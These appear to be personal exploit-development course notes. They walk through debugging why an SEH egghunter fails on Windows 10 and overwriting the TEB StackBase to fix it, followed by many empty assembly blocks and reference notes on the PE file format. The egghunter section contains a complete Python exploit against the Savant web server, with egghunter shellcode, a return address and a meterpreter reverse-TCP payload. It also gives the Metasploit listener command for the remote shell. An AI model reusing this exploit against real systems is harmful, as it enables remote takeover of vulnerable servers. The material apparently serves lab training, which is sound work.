Unfortunately, we never reach our `_except_handler` function. When we resume execution, we trigger the access violation again.

### Identifying the SEH-Based Egghunter Issue

Open `ntdll.dll` in IDA `C:\Installers\egghunter\ntdll.idb`

when an exception is raised, a call to `ntdll!KiUserExceptionDispatcher` is made. This function will then call `RtlDispatchException`, which will retrieve the `ExceptionList` and parse it.

`bp ntdll!RtlDispatchException`

While going through the code blocks of the `RtlDispatchException` function, we find a call to `RtlpGetStackLimits`.

`RtlpGetStackLimits` is used to retrieve the current stack limits.

The `TEB` structure contains the `StackBase` and `StackLimit` values, and `ExceptionList`.

`dt _NT_TIB`

```
ntdll!_NT_TIB
   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 StackBase        : Ptr32 Void
   +0x008 StackLimit       : Ptr32 Void
   +0x00c SubSystemTib     : Ptr32 Void
   +0x010 FiberData        : Ptr32 Void
   +0x010 Version          : Uint4B
   +0x014 ArbitraryUserPointer : Ptr32 Void
   +0x018 Self             : Ptr32 _NT_TIB
```

We find a call to `RtlIsValidHandle`, which is responsible for various checks including the SafeSEH implementation.

When we continue our inspection of other code blocks, we aren't able to find another call to this function.

=> We have to reach this particular code block to successfully call our custom `_except_handler` function.

To reach the `RtlIsValidHandle` call, we have to pass the following checks:

1.	The memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure needs to be higher than the `StackLimit`.

2.	The memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure plus `0x08` needs to be lower than the `StackBase`.

3.	The memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure needs to be aligned to the 4 bytes boundary.

4.	The memory address of our `_except_handler` function needs to be located at a higher address than the `StackBase`.

=>

1. Pass. Because our egghunter code pushed the custom `_EXCEPTION_REGISTRATION_RECORD` structure onto the stack and then overwrote the `ExceptionList` with the value of the ESP register.

2. Pass. Since we pushed the `_EXCEPTION_REGISTRATION_RECORD` structure on the stack. The reason it adds `0x08` bytes from the `_EXCEPTION_REGISTRATION_RECORD` structure is due to its size, which contains 2 DWORD-sized members.
 
3. Pass. Given that we have not performed any arithmetic operations on ESP, we have maintained the alignment. (By default, the OS and compilers ensure that the stack, as well as other classes and structure members, are aligned accordingly.)

4. Failed. Because the `_except_handler` function is implemented in the egghunter located on the stack.

=> we will not reach the call to `RtlIsValidHandle`.

In addition to these 4 checks, if **SafeSEH** is enabled, every `_except_handler` function address is going to be validated by the `RtlIsValidHandle`.

Our binary does not come compiled with any protections.

`!nmod`

```
00400000 00452000 Savant  /SafeSEH OFF  C:\Savant\Savant.exe
```

To bypass the check, we can attempt to overwrite the `StackBase` in the `TEB` with an appropriately crafted value. It would have to be lower than the address of our `_except_handler` function, but higher than the address of our `_EXCEPTION_REGISTRATION_RECORD` structure.

Our egghunter already gathers the address of the `_except_handler` function dynamically, so we could subtract a small number of bytes from it and use that to overwrite the `StackBase`.

`egghunter_seh_win10.py`

```python
...
"	build_exception_record: 				 "
		# pop the address of the exception_handler 
		# into ecx
"		pop ecx 							;" 
		# mov signature into eax
"		mov eax, 0x74303077 				;" 
		# push Handler of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							;" 
		# push Next of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					;" 
		# null out ebx
"		xor ebx, ebx 						;" 
		# overwrite ExceptionList in the TEB with a pointer 
		# to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		;" 
		# subtract 0x04 from the pointer 
		# to exception_handler
"		sub ecx, 0x04 						;" 
		# add 0x04 to ebx
"		add ebx, 0x04 						;" 
		# overwrite the StackBase in the TEB
"		mov dword ptr fs:[ebx], ecx 		;" 
...
```

Our new egghunter adds some additional instructions to the `build_exception_record` function:

- overwrites the `ExceptionList` from the TEB, 

- subtract `0x04` from `ECX`, which still holds the address of our `_except_handler` function.

- increases the value of `EBX` by `0x04` and uses that as an offset into the FS register to overwrite the `StackBase`.

### Porting the SEH Egghunter to Windows 10

#### SEH-based egghunter

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 80
    size = 253

    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 

    egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
                b"\xeb\x2a\x59\xb8\x77\x30\x30\x74"
                b"\x51\x6a\xff\x31\xdb\x64\x89\x23"
                b"\x83\xe9\x04\x83\xc3\x04\x64\x89"
                b"\x0b\x6a\x02\x59\x89\xdf\xf3\xaf"
                b"\x75\x07\xff\xe7\x66\x81\xcb\xff"
                b"\x0f\x43\xeb\xed\xe8\xd1\xff\xff"
                b"\xff\x6a\x0c\x59\x8b\x04\x0c\xb1"
                b"\xb8\x83\x04\x08\x06\x58\x83\xc4"
                b"\x10\x50\x31\xc0\xc3")

    inputBuffer = b"\x41" * (size - len(egghunter))
    inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v  payload

    payload =  b""
    payload += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b"
    ...
    payload += b"\xff\xd5"

    shellcode = b"w00tw00t" + payload + b"\x44" * (400-len(payload))

    buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
    
    print("Done!")
  
except socket.error:
    print("Could not connect!")
```

Set a breakpoint at the `POP EAX; RET` instruction sequence, let the execution flow continue

Inspect the `ExceptionList` and the `StackBase`

`t`

```
03e5eabe 6a02            push    2
```

`!teb`

```
TEB at 00234000
    ExceptionList:        03e5ea2c
    StackBase:            03e5ead2
    StackLimit:           03e5c000
    SubSystemTib:         00000000
...
```

`dt _EXCEPTION_REGISTRATION_RECORD 03e5ea2c`

```
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x03e5ead6     _EXCEPTION_DISPOSITION  +3e5ead6
```

We have successfully managed to overwrite the `StackBase` with a value that is lower than the memory address of our `_except_handler` function, but higher than the memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure.

Letting the debugger continue execution will trigger the access violation. 

Set a breakpoint at the `_except_handler` function to determine if overwriting the `StackBase` was enough.

`g`

```
03e5eac3 f3af            repe scas dword ptr es:[edi]
```

`!exchain`

```
03e5ea2c: 03e5ead6
Invalid exception stack at ffffffff
```

`bp 03e5ead6`

`g`

```
Breakpoint 1 hit
03e5ead6 6a0c            push    0Ch
```

`u @eip`

```
03e5ead6 6a0c            push    0Ch
03e5ead8 59              pop     ecx
03e5ead9 8b040c          mov     eax,dword ptr [esp+ecx]
03e5eadc b1b8            mov     cl,0B8h
03e5eade 83040806        add     dword ptr [eax+ecx],6
03e5eae2 58              pop     eax
03e5eae3 83c410          add     esp,10h
03e5eae6 50              push    eax
```

We managed to successfully reach our `_except_handler` function.

`Eip` member of the `CONTEXT` structure points to the instruction that caused the access violation (`REPE SCASD`).

Remove any breakpoints and let the execution flow resume while waiting for our shell. 

Unfortunately, every time we hit an unmapped memory page or one we don't have access to, we get an access violation, which halts the debugger.

These can be temporarily disabled in WinDbg.

To avoid stopping the execution for every "first time" exception, use the `sxd` command to disable them. This will also **disable guard pages**.

`sxd av`

`sxd gp`

`bc *`

`g`

Set up a listener.

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; exploit"
```

Our egghunter maintains functionality on older Windows versions such as 7 or 8.

## Extra Mile

```python

```

# Creating Custom Shellcode

# Reverse Engineering for Bugs




# Stack Overflows and DEP Bypass

```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

# Portable Executable File Format

[PE Format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)

## MS-DOS Header and Stub Program

The **MS-DOS header** is always found at the beginning of the file.

The stub program comes directly after the DOS header and the DOS header is 0x40 bytes in size.
=> **DOS stub** is located at an offset of **0x40**

**e_lfanew**, a LONG (4 bytes), represents the number of bytes from the beginning of the image file to the **PE header**. This distance from the beginning of the file is aka a **file offset**.

### PE Header

The offset of **File header** is 4 bytes after the beginning of the **PE header**.

```
typedef struct _IMAGE_NT_HEADERS {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
```

### File Header

```
typedef struct _IMAGE_FILE_HEADER {
    WORD    Machine
    WORD    NumberOfSections;
    DWORD   TimeDateStamp;
    DWORD   PointerToSymbolTable;
    DWORD   NumberOfSymbols;
    WORD    SizeOfOptionalHeader;
    WORD    Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
```

**Characteristics** contains a number of flags that characterize the file.
- IMAGE_FILE_EXECUTABLE_IMAGE (0x0002) indicates that the file is executable, a characteristic that is only given to PE images.
- IMAGE_FILE_DLL (0x2000) indicates that the file is a DLL.
- IMAGE_FILE_RELOCS_STRIPPED (0x0001) indicates that the file does not contain a base relocation table and must be loaded at the preferred base address.

Our executable contains 2 flags: 0x2 (IMAGE_FILE_EXECUTABLE_IMAGE) and 0x100 (IMAGE_FILE_32BIT_MACHINE), which indicates that the intended architecture is 32-bit.
=> 0x2 bitwise OR 0x100 = 0x102

The size of the *File Header* is 20 (0x14) bytes

### Optional Header

- **AddressOfEntryPoint** contains the Relative Virtual Address (RVA) of the entry point, the location in the program where execution begins. The **RVA** is an address relative to the base address, where the first bytes of the PE file are loaded into memory. In C and C-related languages, the entry point is located just before the **main** function in execution. It's typically found in the **.text** section by default. 
- **BaseOfCode** contains the RVA of the PE section, which contains executable code. This is typically the *.text* section.
- On disk, **ImageBase** contains the preferred base address at which the first byte of data is loaded into memory. Although the *ImageBase* address is preferred, it may not be available and if the file allows (i.e. if it contains relocation information), it may be loaded at a different address.
- With the base address, we can calculate a Virtual Address (**VA**) by adding to it the RVA (base address + RVA = VA).

The difference between the file offset and RVA of corresponding values is caused by:
- **SectionAlignment** contains the alignment factor in bytes used for sections in **memory**. By default, this is the **page size** of the executable's intended architecture. This is typically 0x1000 and, sections in memory begin at RVAs that are multiples of 0x1000. **BaseOfCode**, which holds the RVA of the .text section, also has the value 0x1000.
- **FileAlignment** indicates the alignment factor in bytes used for sections in the PE image file on **disk**. This means that the file offsets of sections on disk are multiples of this value.

- **SizeOfImage** contains the size in bytes rounded up to a multiple of SectionAlignment of the entire image when loaded into memory. This indicates to the loader the amount of memory that is required to load the image.
- **SizeOfHeaders** contains the size of all headers when rounded up to a multiple of FileAlignment.
- For both SizeOfImage and SizeOfHeaders, the additional space that results from rounding up from the size of data is padded with zeros.

### DataDirectory in Optional Header
**DataDirectory** contains a number of entries for important data structures that may be needed at run-time and functions as an easy way to locate them.

```
typedef struct _IMAGE_OPTIONAL_HEADER {
    ...
    DWORD   NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
```

IMAGE_NUMBEROF_DIRECTORY_ENTRIES is contained in the **NumberOfRvaAndSizes** field in the Optional Header.

```
typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

Each entry consists of 2 elements. These are the RVA of the data structure and size of the data. 

Each variable is defined as an *index* into the data directory and is associated with a particular data structure.

```
#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory
#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory
#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory
#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP
#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory
#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers
#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table
#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors
#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor
```

- **Export Directory**: to resolve the symbols for functions, which are exported by the current PE image and available to be imported by others. allows the loader to *find the address of specific functions that are imported by other modules*. Exports are typically provided by DLLs. In this case, the RVA is "0" and the size is "0", indicating that the executable does not have an export table and does not export any symbols.
- **Import** Directory: to resolve the symbols imported by the executable from other modules. helps the executable *resolve the addresses of imported functions*.
- **Base Relocation Table** helps the loader to load the executable at an address other than the preferred base address. helps the loader *find addresses that must be re-based with respect to the load address used*.
- **Import Address Table (IAT)** is a specific table containing import-related information. On disk, its entries helps the loader *find the virtual addresses of imported functions* and, once those addresses are found, they are overwritten with the corresponding addresses.

### Section Headers
- **VirtualSize**, in the case of an image, is interpreted as the size of the section when loaded into memory
- **VirtualAddress** contains the RVA for the first byte of the section. The RVAs of sections must be a multiple of the alignment factor *SectionAlignment*.
- **PointerToRawData** is the file offset of the beginning of the section on disk. Sections must begin on file offsets that are multiples of the alignment factor *FileAlignment*.
- **SizeOfRawData** contains the size of the initialized data on disk. This number is also rounded up to a multiple of FileAlignment
    - If VirtualSize < SizeOfRawData, the remaining bytes in between the end of the data in the .text section and the beginning of the next section are **null padded** (filled with null bytes).
    - A .text section with a virtual size > the raw size may indicate that the executable has been **packed**.

- **Characteristics** are **section flags** that represent attributes of the section.
    - IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, and IMAGE_SCN_MEM_EXECUTE specify that the section can be read, written, or executed, respectively.
    - IMAGE_SCN_CNT_CODE, IMAGE_SCN_CNT_INITIALIZED_DATA, and IMAGE_SCN_CNT_UNINITIALIZED_DATA indicate that a section contains executable code, initialized data, or uninitialized data, respectively.

The Characteristics 0x60000020 is composed of 3 flags that have been combined into a single value using a **bitwise OR** operation: 0x40000000 (IMAGE_SCN_MEM_READ), 0x20000000 (IMAGE_SCN_MEM_EXECUTE), and 0x00000020 (IMAGE_SCN_CNT_CODE).

The .text section is marked as both containing executable code (IMAGE_SCN_CNT_CODE) and as executable (IMAGE_SCN_MEM_EXECUTE). Each section that contains code is also executable, but not all sections that are executable necessarily contain code.
- The IMAGE_SCN_CNT_CODE indicates that the contents of the section are executable code
- IMAGE_SCN_MEM_EXECUTE indicates that the memory range that contains the code is capable of being executed.

### Important Standard Sections
- **.text** section typically contains executable code and is readable and executable but *not writable*.
- **.data** section contains **initialized** variables, i.e., these variables are assigned a specific initial value at compile time. This includes global and static variables that are initialized. The values can be changed at any point during run-time. => the .data section is both readable and *writable*.
- **.bss** section contains **uninitialized** variables, i.e., the static and global variables are not assigned a specific initial value at compile-time (to take up less space on disk). On Windows and other OSs, the .bss section is initialized to zero in memory. Because it is set during run-time, it is both readable and *writable*, like the .data section.
- **.rdata** contains **constant** initialized data and is *read-only*. This data may be constant global and static variables or many other data types.
- **.rsrc** section contains additional resources (icons, bitmaps, menus, strings, etc.) that the image may use for things like multi-language support with each language being supported by a particular resource. This section is marked as *read-only*.
- **.reloc** contains relocation data that helps the loader re-base the image if it cannot be loaded at its preferred base address. To do this, there must be a base relocation table, which consists of base relocation blocks. These blocks each represent a single page and contain the offsets of each memory location where re-basing must be performed and the type of re-basing that must be applied to it.
- **.edata** section allows the symbols exported by the PE image to be imported by another module. In order to use an imported symbol, the PE image that imports it must be able to resolve its address, something that export data helps with.
- **.idata** section allows an image to resolve the symbols that it imports from other modules to addresses at run-time.

### Export Directory Table
.edata is typically merged into .rdata by Visual Studio during the compilation process

```
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;     // RVA: Export Address Table
    DWORD   AddressOfNames;         // RVA: Export Name Pointer Table
    DWORD   AddressOfNameOrdinals;  // RVA: Ordinal Table
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

To store the location of other export-related tables.
- AddressOfFunctions contains the **Export Address Table**,
- AddressOfNames contains the **Export Name Pointer Table**, and
- AddressOfNameOrdinals contains the **Ordinal Table**.

Symbols can be referred to in 2 ways, either by an ordinal number associated with them or by name (a string).

- Suppose imports take place using **ordinals**. An ordinal, in this case, is simply an index into the *Export Address Table*, which contains the RVA of each symbol as entries.
- If **names** are used, the loader uses the *Export Name Pointer Table* and the *Ordinal Table*. These tables correspond in the sense that the n-th entry of the Ordinal Table contains the ordinal for the symbol pointed to by the n-th entry of the Export Name Pointer Table. In this case, the loader first searches the Export Name Pointer Table for the symbol name and when it finds it, derives the ordinal from the corresponding entry in the Ordinal Table. It then uses this ordinal to find the symbol's RVA in the Export Address Table.

### Import Directory Table

.idata is typically merged into .rdata by Visual Studio during the compilation process

The **.idata** section contains information that allows an image to resolve the symbols that it imports from other modules to addresses at run-time. Import information is important for **malware analysis** because the functions that are imported and used can tell us a lot about what the program does and can help us identify malicious software.
The import information begins with the Import Directory Table, which is a sequence of entries, one for each DLL imported.

```
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD   Characteristics;
        DWORD   OriginalFirstThunk; // RVA: Import Lookup Table (ILT)
    } DUMMYUNIONNAME;
    DWORD   TimeDateStamp;
    DWORD   ForwarderChain;
    DWORD   Name;
    DWORD   FirstThunk;             // RVA: Import Address Table (IAT)
} IMAGE_IMPORT_DESCRIPTOR;
```

- **Name** is the RVA of the string that contains the DLL name.
- **OriginalFirstThunk** and **FirstThunk** point to the **Import Lookup / Name Table (ILT / INT)** and **Import Address Table (IAT)**, respectively, for the specific DLL. Until binding, in which imported symbols are resolved to addresses, these two tables have the same content and consist of entries for each imported function. When the addresses of these imported functions are resolved, the IAT entries are overwritten with the resolved addresses.

The entries of the ILT end IAT are defined by the IMAGE_THUNK_DATA structure.
```
typedef struct _IMAGE_THUNK_DATA32 {
    union {
        DWORD ForwarderString;      
        DWORD Function;             
        DWORD Ordinal;
        DWORD AddressOfData;       
    } u1;
} IMAGE_THUNK_DATA32;
```
the DWORD in IMAGE_THUNK_DATA32 can be interpreted in different ways. For executable files, it has two possible interpretations, which correspond to the 2 different ways that symbols can be referred to. The first is as an Ordinal number. The second, which eventually leads to the symbol name, is, as AddressOfData, an RVA to an IMAGE_IMPORT_BY_NAME structure in the Hint/Name Table.
Note that we can tell whether ordinals or symbol names are used by inspecting the highest bit of the Ordinal/AddressOfData field. If it's set, ordinals are used. If not, imports use names.
Let's inspect IMAGE_IMPORT_BY_NAME.
```
typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD    Hint;
    CHAR   Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
```
- **Hint**, which is an index into the Export Name Pointer Table. This table belongs to the export data of the DLL and contains pointers to the function name. We discussed it above in the context of the Export Directory structure.
The second field is a string that contains the name of the imported function. The name is used to confirm that the hint has located the correct entry in the Export Name Pointer Table or, if the hint does not locate it, to find the correct entry. Recall that this entry is used to find the ordinal for the symbol and, ultimately, its RVA. Once the RVA is found, the loader overwrites the entry in the IAT with this value.

### Inspecting PE Files with WinDbg

| **Command** | **Description** |
| --------------|-------------------|
| `lm` | find the load address, which may not the same value contained in ImageBase, the preferred base address, `00770000` |
| `dt ntdll!_IMAGE_DOS_HEADER 00770000` | inspect the contents of MS-DOS header, `e_lfanew: 0n248` |
| `dt ntdll!_IMAGE_NT_HEADERS 00770000+0n248` | inspect the PE file header |
| `!dh -h` | dumps headers from an image based at address |
| `!dh -f 00770000` | display the PE file headers of the modules |